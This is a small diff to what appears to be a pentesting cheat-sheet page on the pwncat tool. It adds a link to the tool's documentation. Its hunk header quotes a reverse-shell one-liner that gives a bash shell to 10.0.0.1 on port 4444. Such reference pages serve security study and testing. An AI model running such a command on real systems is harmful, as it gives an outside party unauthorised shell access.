@@ -98,3 +98,5 @@ pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 ## <mark style="color:red;">Also Pwncat :)</mark>
 
 {% embed url="https://github.com/calebstewart/pwncat" %}
+
+{% embed url="https://pwncat.readthedocs.io/en/latest/" %}
